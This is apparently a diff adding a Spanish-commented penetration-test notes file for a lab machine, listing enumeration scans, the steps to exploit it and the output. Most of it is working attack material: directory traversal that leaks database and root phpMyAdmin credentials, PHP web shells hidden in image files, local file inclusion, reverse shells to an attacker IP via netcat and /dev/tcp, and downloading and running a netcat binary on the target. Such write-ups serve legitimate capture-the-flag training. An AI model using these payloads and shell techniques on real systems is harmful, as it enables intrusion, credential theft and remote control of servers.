@@ -1,0 +1,152 @@
+###################################################################################################################################################################################################################
+[ 1 ] ENUMERATION
+
+// OS
+sudo nmap -O 192.168.1.11
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.8
+
+// SERVICES
+nmap -sV -T4 -p 1-65535 192.168.1.11
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu)
+
+// DIRECTORIES
+dirb http://192.168.1.11 /usr/share/wordlists/dirb/big.txt
+!!!!! File Upload
+http://192.168.1.11/add => File upload
+http://192.168.1.10/in => php.ini
+!!!!! Directory Transversal
+http://192.168.1.10/test => php function that ask for a file parameter
+http://192.168.1.10/phpmy/js/ => javascript files list
+http://192.168.1.10/phpmy/scripts/ => php and sql files
+http://192.168.1.10/phpmy/setup/  => phpmyadmin setup
+http://192.168.1.10/phpmy/setup/lib/ => php files
+
+// NIKTO
+nikto -host 192.168.1.10 -port 80
++ Server: Apache
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie proteus_session created without the httponly flag
+
+
+###################################################################################################################################################################################################################
+[ 2 ] EXPLOTATION
+
+2.1) Directory Transversal
+curl -X POST -F 'file=/var/www/c.php' 192.168.1.11/test.php
+$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
+// Accedo por phpmyadmin y saco estas credenciales
+biLLu 	hEx_it
+
+// De este fichero saco las credenciales de root
+curl -X POST -F 'file=/var/www/phpmy/config.inc.phop' 192.168.1.11/test.php
+file not found[revil@lockpicker Descargas]$ curl -X POST -F 'file=/var/www/phpmy/config.inc.php' 192.168.1.11/test.php
+<?php
+
+/* Servers configuration */
+$i = 0;
+
+/* Server: localhost [1] */
+$i++;
+$cfg['Servers'][$i]['verbose'] = 'localhost';
+$cfg['Servers'][$i]['host'] = 'localhost';
+$cfg['Servers'][$i]['port'] = '';
+$cfg['Servers'][$i]['socket'] = '';
+$cfg['Servers'][$i]['connect_type'] = 'tcp';
+$cfg['Servers'][$i]['extension'] = 'mysqli';
+$cfg['Servers'][$i]['auth_type'] = 'cookie';
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'roottoor';
+$cfg['Servers'][$i]['AllowNoPassword'] = true;
+
+2.2 File Upload
+!!!!!
+// Accedo a esta URL con el Zap de proxy
+http://192.168.1.11/panel.php
+load=../../../../etc/passwd&continue=continue
+
+// Añado en un comentario de una imagen una shell en php
+exiftool -comment='<?php echo shell_exec($_GET["x"]);?>' BA.png 
+    1 image files updated
+
+//Subo el fichero usando el File uploader de manera normal
+
+
+Local File Inclusion
+!!!!!
+//Ahora que tengo el fichero subido vuelvo a usar el zap en la misma URL
+http://192.168.1.11/panel.php
+POST http://192.168.1.11/panel.php?x=whoami HTTP/1.1
+load=../../../../var/www/uploaded_images/small.png&continue=continue
+
+// Ahora que funciona abro netcat a la escucha
+nc -nlvp 8088
+// Cambio el payload a:
+nc -e /bin/bash 192.168.1.8 8088
+bash -i >& /dev/tcp/192.168.1.8/8088 0>&1
+// No funcionan
+
+// Subo el binario de netcat de 32 bits a un apache
+cp /bin/nc /var/www/html/nc32
+
+//Lo descargo ussando el zap de proxy
+wget 192.168.1.55/nc32 -P /tmp/
+//payload
+POST http://192.168.1.11/panel.php?x=wget 192.168.1.55/nc32 -P /tmp/ HTTP/1.1
+load=../../../../var/www/uploaded_images/small.png&continue=continue
+
+// Le doy permisos de ejecucion
+// No puede ser +x porque entiende las x como espacios
+chmod 755 /tmp/nc32
+//payload
+POST http://192.168.1.11/panel.php?x=chmod 755 /tmp/nc32 HTTP/1.1
+load=../../../../var/www/uploaded_images/small.png&continue=continue
+
+// Lanzo netcat
+/tmp/nc32 192.168.1.8 8088 -e /bin/bash
+//payload
+POST http://192.168.1.11/panel.php?x=/tmp/nc32 192.168.1.8 8088 -e /bin/bash HTTP/1.1
+load=../../../../var/www/uploaded_images/small.png&continue=continue
+
+Connection from 192.168.1.11 45018 received!
+
+// shell interactiva
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+###################################################################################################################################################################################################################
+[ 3 ] PRIVILEGE ESCALATION
+
+// Busco la version del kernel
+uname -r
+3.13.0-32-generic
+
+// Encuentro este exploit
+https://www.exploit-db.com/exploits/37292/
+
+###################################################################################################################################################################################################################
+[ + ] INFORMATION
+
+// Encuentro php.ini publicado
+192.168.1.10/in
+System 	Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686
+Build Date 	Feb 13 2017 20:25:26
+Server API 	Apache 2.0 Filter
+Virtual Directory Support 	disabled
+Configuration File (php.ini) Path 	/etc/php5/apache2filter
+Loaded Configuration File 	/etc/php5/apache2filter/php.ini
+Scan this dir for additional .ini files 	/etc/php5/apache2filter/conf.d
+Additional .ini files parsed 	/etc/php5/apache2filter/conf.d/mysql.ini, /etc/php5/apache2filter/conf.d/mysqli.ini, /etc/php5/apache2filter/conf.d/pdo.ini, /etc/php5/apache2filter/conf.d/pdo_mysql.ini 
+
+###################################################################################################################################################################################################################
+
+// Shell gif
+$ echo 'FFD8FFEo' | xxd -r -p > shell.gif
+$ echo '<?php passthru($_GET['cmd']); ?>' >> shell.gif
+$ cat shell.gif
+ÿOÿ<?php passthru($_GET[cmd]); ?>
